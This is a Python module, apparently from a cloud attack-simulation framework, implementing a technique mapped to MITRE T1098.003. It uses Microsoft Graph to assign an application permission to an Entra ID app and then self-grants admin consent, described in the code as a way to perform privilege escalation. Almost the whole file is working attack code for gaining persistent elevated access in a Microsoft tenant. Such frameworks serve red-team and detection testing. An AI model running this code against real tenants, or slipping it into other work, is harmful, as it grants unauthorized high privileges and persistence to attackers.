from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from core.entra.graph_request import GraphRequest

@TechniqueRegistry.register
class EntraAssignAppPermission(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1098.003",
                technique_name="Account Manipulation",
                tactics=["Persistence", "Privilege Escalation"],
                sub_technique_name="Additional Cloud Roles"
            )
        ]
        
        super().__init__("Assign App Permission", "Assign permission to an app to perform privilege escalation", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        
        try:
            app_obj_id: str = kwargs.get('app_obj_id', None)
            permission_id: str = kwargs.get('permission_id', None)
            grant_admin_consent: bool = kwargs.get('grant_admin_consent', True)
            
            if app_obj_id in [None, ""] or permission_id in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": "Invalid Technique Input"
                }
            
            # Validate permission ID
            if GraphRequest().check_guid(permission_id) == False:
                return ExecutionStatus.FAILURE, {
                    "error": {"Error" : "Invalid Technique Input - Permission ID"},
                    "message": {"Error" : "Invalid Technique Input - Permission ID"}
                }
            
            if grant_admin_consent in [None, ""]:
                grant_admin_consent = True

            # Get app info
            if GraphRequest().check_guid(app_obj_id) == False:
                # Get app guid if upn provided in input
                app_string = app_obj_id
                app_endpoint_url = 'https://graph.microsoft.com/v1.0/applications'
                params = {
                    '$filter': f'displayName eq \'{app_string}\''
                }

                app_recon_response = GraphRequest().get(app_endpoint_url, params=params)
                if 'error' in app_recon_response:
                    # Graph request failed
                    return ExecutionStatus.FAILURE, {
                        "error": {
                            "error_code" :app_recon_response.get('error').get('code'),
                            "error_detail" : app_recon_response.get('error').get('message')
                        },
                        "message": "Failed to get app details"
                    }
                
                # Get app_id and app_obj_id
                for app in app_recon_response:
                    app_id = app['appId']
                    app_obj_id = app['id']
            
            else:
                # Get additional app info if app object id provided in input
                app_endpoint_url = f"https://graph.microsoft.com/v1.0/applications/{app_obj_id}"
                app_recon_response = GraphRequest().get(app_endpoint_url)
                if 'error' in app_recon_response:
                    # Graph request failed
                    return ExecutionStatus.FAILURE, {
                        "error": {
                            "error_code" :app_recon_response.get('error').get('code'),
                            "error_detail" : app_recon_response.get('error').get('message')
                        },
                        "message": "Failed to get app details"
                    }
                
                # get user_id and user_upn
                app_id = app_recon_response['appId']
                app_obj_id = app_recon_response['id']

            # Attempt role assignment
            endpoint_url = f"https://graph.microsoft.com/v1.0/applications/{app_obj_id}"

            # Create request payload
            data = {
                "requiredResourceAccess": [
                    {
                        "resourceAppId": "00000003-0000-0000-c000-000000000000",  # Microsoft Graph
                        "resourceAccess": [
                            {
                                "id": permission_id,
                                "type": "Role"
                            }
                        ]
                    }
                ]
            }

            # Attempt to assign app permission
            raw_response = GraphRequest().patch(url = endpoint_url, data = data)

            # Request successfull
            if 200 <= raw_response.status_code < 300:
                # Create output
                output = {
                    'permission_assigned' : True,
                    'app_obj_id' : app_obj_id,
                    'admin_consent_granted' : False
                }
                
                if grant_admin_consent:
                    # Get Service Principal ID
                    sp_endpoint_url = f"https://graph.microsoft.com/v1.0/servicePrincipals?$filter=appId eq '{app_id}'"
                    sp_response = GraphRequest().get(url = sp_endpoint_url)

                    if 'error' in sp_response:
                        print("Failed to retrive Service Principal ID")
                    else:
                        sp_id = sp_response[0]['id']

                    # Get Microsoft Graph App SP for resourceID
                    mg_sp_endpoint_url = f"https://graph.microsoft.com/v1.0/servicePrincipals?$filter=appId eq '00000003-0000-0000-c000-000000000000'"
                    mg_sp_response = GraphRequest().get(url = mg_sp_endpoint_url)

                    if 'error' in mg_sp_response:
                        print("Failed to retrive Service Principal ID")
                    else:
                        resource_id = mg_sp_response[0]['id']

                    # Get permission info
                    permission_url = f"https://graph.microsoft.com/v1.0/servicePrincipals/{resource_id}?$select=appRoles"
                    permission_info_response = GraphRequest().get(url = permission_url)
                    if permission_info_response['appRoles']:
                        for role in permission_info_response['appRoles']:
                            if role['id'] == permission_id:
                                permission_info = role

                    output['permission_details'] = permission_info

                    if sp_id:
                        # Grant admin consent
                        consent_endpoint_url = f"https://graph.microsoft.com/v1.0/servicePrincipals/{sp_id}/appRoleAssignments"
                        
                        consent_data = {
                            "resourceId": resource_id,  # Microsoft Graph SP
                            "principalId": sp_id, # My apps SP
                            "appRoleId": permission_id,
                        }
                        # Attempt to grant admin consent
                        consent_response = GraphRequest().post(url = consent_endpoint_url, data = consent_data)
                        
                        if 200 <= consent_response.status_code < 300:
                            # Successfully consented admin grant
                            output['admin_consent_granted'] = True
                        else:
                            # Failed to conset admin grant
                            output['grant_admin_consent_error'] = f"{consent_response.status_code} - {consent_response.text}"

                return ExecutionStatus.SUCCESS, {
                    "message": f"Successfully assigned permission - {permission_id} to app - {app_obj_id}",
                    "value": output
                }
            
            # Request failed
            return ExecutionStatus.FAILURE, {
                "error": {"error_code" : raw_response.json().get('error').get('code', 'N/A'), 
                        "error_message" :raw_response.json().get('error').get('message', 'N/A')
                    },
                "message": "Failed to assign role to user"
            }

        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to assign role to user"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "app_obj_id": {"type": "str", "required": True, "default":None, "name": "App Name or Object ID", "input_field_type" : "text"},
            "permission_id": {"type": "str", "required": True, "default":None, "name": "Permission ID", "input_field_type" : "text"},
            "grant_admin_consent": {"type": "bool", "required": False, "default":True, "name": "Grant Admin Consent to Permission", "input_field_type" : "bool"},
        }